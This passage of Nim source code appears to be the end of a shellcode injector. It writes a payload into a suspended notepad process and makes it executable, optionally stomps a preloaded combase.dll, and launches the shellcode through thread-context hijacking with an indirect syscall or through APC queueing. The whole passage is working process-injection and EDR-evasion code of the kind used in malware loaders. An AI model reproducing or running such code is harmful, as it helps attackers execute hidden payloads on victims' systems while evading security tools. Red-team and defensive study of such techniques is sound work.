    if pWriteProcessMemory(hProc, base, unsafeAddr payload[0],
                           SIZE_T(payload.len), addr written) == 0:
      return nil
    if written != SIZE_T(payload.len): return nil
    var oldProt: DWORD
    if pVirtualProtectEx(hProc, base, SIZE_T(payload.len),
                         PAGE_EXECUTE_READ, addr oldProt) == 0:
      return nil
    return base

  # Pre-load combase.dll so moduleStomping has a viable large .text candidate.
  # A CREATE_SUSPENDED notepad only has ntdll/kernel32/kernelbase -- all in the
  # skip list. combase.dll has a ~2MB .text section, large enough for any shellcode.
  when defined(moduleStomping):
    preloadDllInProcess(pi.hProcess, apiName("C:\\Windows\\System32\\combase.dll"))

  let remote = allocRemoteShellcode(pi.hProcess, pi.dwProcessId, sc)
  dbg("remote shellcode addr: " & $cast[uint](remote))
  when defined(wipe):
    zeroMem(addr sc[0], sc.len)
  if remote == nil:
    dbg("shellcode allocation failed - exiting")
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return

  # Execution trigger
  when defined(threadHijack):
    var ctx: CONTEXT
    # CONTEXT_CONTROL is enough for RIP redirect and more reliable than CONTEXT_FULL.
    ctx.ContextFlags = CONTEXT_CONTROL
    if pGetThreadContext(pi.hThread, addr ctx) == 0:
      dbg("GetThreadContext failed")
      CloseHandle(pi.hThread)
      CloseHandle(pi.hProcess)
      return
    dbg("original RIP: " & $ctx.Rip)
    ctx.Rip = cast[DWORD64](remote)
    ctx.ContextFlags = CONTEXT_CONTROL
    var ctxOk = false
    when defined(haloGate):
      dbg("haloGate SSN=" & $gSsnNtSetContextThread & " gadget=" & $cast[uint](gHaloGadget))
      if gSsnNtSetContextThread != 0xFFFF'u32 and gHaloGadget != nil:
        let st = indirectNtSetContextThread(
          gSsnNtSetContextThread, gHaloGadget, pi.hThread, addr ctx)
        dbg("indirectNtSetContextThread status: " & $st)
        ctxOk = (st == 0)
    if not ctxOk:
      dbg("fallback to SetThreadContext")
      ctxOk = pSetThreadContext(pi.hThread, addr ctx) != 0
      dbg("SetThreadContext result: " & $ctxOk)
    if not ctxOk:
      dbg("SetThreadContext failed - exiting")
      CloseHandle(pi.hThread)
      CloseHandle(pi.hProcess)
      return
    dbg("ResumeThread")
    discard ResumeThread(pi.hThread)
  else:
    dbg("NtQueueApcThread + ResumeThread")
    discard pNtQueueApcThread(pi.hThread, remote, nil, nil, nil)
    discard ResumeThread(pi.hThread)

  dbg("injection complete - handles closed")
  CloseHandle(pi.hThread)
  CloseHandle(pi.hProcess)

hMain()
